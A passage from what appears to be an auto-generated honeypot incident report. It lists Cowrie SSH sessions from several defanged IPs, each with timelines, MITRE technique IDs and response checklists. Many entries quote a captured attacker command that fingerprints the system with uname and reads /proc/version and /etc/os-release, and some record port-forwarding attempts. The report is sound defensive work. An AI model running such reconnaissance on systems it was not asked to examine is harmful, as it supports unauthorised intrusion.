| `2026-08-02 04:41:53` | `cowrie.session.params` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.success` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:53` | `cowrie.command.input` |
| `2026-08-02 04:41:54` | `cowrie.log.closed` |
| `2026-08-02 04:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c220a346c03b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:42 |
| **Last Seen** | 2026-08-02 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:42:52` | `cowrie.session.connect` |
| `2026-08-02 04:42:52` | `cowrie.client.version` |
| `2026-08-02 04:42:52` | `cowrie.client.kex` |
| `2026-08-02 04:42:53` | `cowrie.login.success` |
| `2026-08-02 04:42:53` | `cowrie.session.params` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.success` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.command.input` |
| `2026-08-02 04:42:53` | `cowrie.log.closed` |
| `2026-08-02 04:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52454552318a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:43 |
| **Last Seen** | 2026-08-02 04:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:43:57` | `cowrie.session.connect` |
| `2026-08-02 04:43:57` | `cowrie.client.version` |
| `2026-08-02 04:43:57` | `cowrie.client.kex` |
| `2026-08-02 04:43:59` | `cowrie.login.success` |
| `2026-08-02 04:44:01` | `cowrie.session.params` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.success` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:01` | `cowrie.command.input` |
| `2026-08-02 04:44:02` | `cowrie.log.closed` |
| `2026-08-02 04:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a1b2c59b6c6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:44 |
| **Last Seen** | 2026-08-02 04:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:44:56` | `cowrie.session.connect` |
| `2026-08-02 04:44:56` | `cowrie.client.version` |
| `2026-08-02 04:44:56` | `cowrie.client.kex` |
| `2026-08-02 04:44:58` | `cowrie.login.success` |
| `2026-08-02 04:44:59` | `cowrie.session.params` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.success` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:44:59` | `cowrie.command.input` |
| `2026-08-02 04:45:00` | `cowrie.log.closed` |
| `2026-08-02 04:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41b249e783e6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:45 |
| **Last Seen** | 2026-08-02 04:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:45:58` | `cowrie.session.connect` |
| `2026-08-02 04:45:58` | `cowrie.client.version` |
| `2026-08-02 04:45:58` | `cowrie.client.kex` |
| `2026-08-02 04:46:00` | `cowrie.login.success` |
| `2026-08-02 04:46:01` | `cowrie.session.params` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.success` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:01` | `cowrie.command.input` |
| `2026-08-02 04:46:02` | `cowrie.log.closed` |
| `2026-08-02 04:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-376404644aa9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:47 |
| **Last Seen** | 2026-08-02 04:47 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:47:00` | `cowrie.session.connect` |
| `2026-08-02 04:47:02` | `cowrie.client.version` |
| `2026-08-02 04:47:02` | `cowrie.client.kex` |
| `2026-08-02 04:47:08` | `cowrie.login.success` |
| `2026-08-02 04:47:16` | `cowrie.session.params` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.success` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:16` | `cowrie.command.input` |
| `2026-08-02 04:47:18` | `cowrie.log.closed` |
| `2026-08-02 04:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a63d81ede0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:47 |
| **Last Seen** | 2026-08-02 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:47:00` | `cowrie.session.connect` |
| `2026-08-02 04:47:01` | `cowrie.client.version` |
| `2026-08-02 04:47:01` | `cowrie.client.kex` |
| `2026-08-02 04:47:02` | `cowrie.login.success` |
| `2026-08-02 04:47:03` | `cowrie.session.params` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.success` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.command.input` |
| `2026-08-02 04:47:03` | `cowrie.log.closed` |
| `2026-08-02 04:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f161297f92ae

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:48 |
| **Last Seen** | 2026-08-02 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:48:04` | `cowrie.session.connect` |
| `2026-08-02 04:48:04` | `cowrie.client.version` |
| `2026-08-02 04:48:04` | `cowrie.client.kex` |
| `2026-08-02 04:48:05` | `cowrie.login.success` |
| `2026-08-02 04:48:06` | `cowrie.session.params` |
| `2026-08-02 04:48:06` | `cowrie.command.input` |
| `2026-08-02 04:48:06` | `cowrie.command.input` |
| `2026-08-02 04:48:06` | `cowrie.command.input` |
| `2026-08-02 04:48:06` | `cowrie.command.input` |
| `2026-08-02 04:48:06` | `cowrie.command.input` |
| `2026-08-02 04:48:06` | `cowrie.command.success` |
| `2026-08-02 04:48:06` | `cowrie.command.input` |
| `2026-08-02 04:48:06` | `cowrie.command.input` |
| `2026-08-02 04:48:07` | `cowrie.command.input` |
| `2026-08-02 04:48:07` | `cowrie.command.input` |
| `2026-08-02 04:48:07` | `cowrie.log.closed` |
| `2026-08-02 04:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42293c59919b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-02 04:48 |
| **Last Seen** | 2026-08-02 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:48:14` | `cowrie.session.connect` |
| `2026-08-02 04:48:14` | `cowrie.client.version` |
| `2026-08-02 04:48:14` | `cowrie.client.kex` |
| `2026-08-02 04:48:14` | `cowrie.login.success` |
| `2026-08-02 04:48:15` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:48:15` | `cowrie.direct-tcpip.data` |
| `2026-08-02 04:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6c05595c0d3

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-08-02 04:48 |
| **Last Seen** | 2026-08-02 04:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:48:31` | `cowrie.session.connect` |
| `2026-08-02 04:48:31` | `cowrie.client.version` |
| `2026-08-02 04:48:31` | `cowrie.client.kex` |
| `2026-08-02 04:48:32` | `cowrie.login.success` |
| `2026-08-02 04:48:33` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1342d6d283ae

| Field | Detail |
|---|---|
| **Source IP** | `222.92.61[.]242` |
| **First Seen** | 2026-08-02 04:48 |
| **Last Seen** | 2026-08-02 04:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:48:38` | `cowrie.session.connect` |
| `2026-08-02 04:48:39` | `cowrie.client.version` |
| `2026-08-02 04:48:39` | `cowrie.client.kex` |
| `2026-08-02 04:48:42` | `cowrie.login.success` |
| `2026-08-02 04:48:44` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.92.61[.]242` to AbuseIPDB if not already reported
- [ ] Block `222.92.61[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ada781e76c5f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:49 |
| **Last Seen** | 2026-08-02 04:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:49:13` | `cowrie.session.connect` |
| `2026-08-02 04:49:13` | `cowrie.client.version` |
| `2026-08-02 04:49:13` | `cowrie.client.kex` |
| `2026-08-02 04:49:14` | `cowrie.login.success` |
| `2026-08-02 04:49:15` | `cowrie.session.params` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.success` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.command.input` |
| `2026-08-02 04:49:15` | `cowrie.log.closed` |
| `2026-08-02 04:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788d18eacd26

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:49 |
| **Last Seen** | 2026-08-02 04:50 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:49:51` | `cowrie.session.connect` |
| `2026-08-02 04:49:53` | `cowrie.client.version` |
| `2026-08-02 04:49:53` | `cowrie.client.kex` |
| `2026-08-02 04:50:03` | `cowrie.login.success` |
| `2026-08-02 04:50:09` | `cowrie.session.params` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.success` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:09` | `cowrie.command.input` |
| `2026-08-02 04:50:12` | `cowrie.log.closed` |
| `2026-08-02 04:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a7d38de2f6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:50 |
| **Last Seen** | 2026-08-02 04:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:50:26` | `cowrie.session.connect` |
| `2026-08-02 04:50:26` | `cowrie.client.version` |
| `2026-08-02 04:50:26` | `cowrie.client.kex` |
| `2026-08-02 04:50:27` | `cowrie.login.success` |
| `2026-08-02 04:50:28` | `cowrie.session.params` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.success` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.command.input` |
| `2026-08-02 04:50:28` | `cowrie.log.closed` |
| `2026-08-02 04:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253b1fe60be1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:51 |
| **Last Seen** | 2026-08-02 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
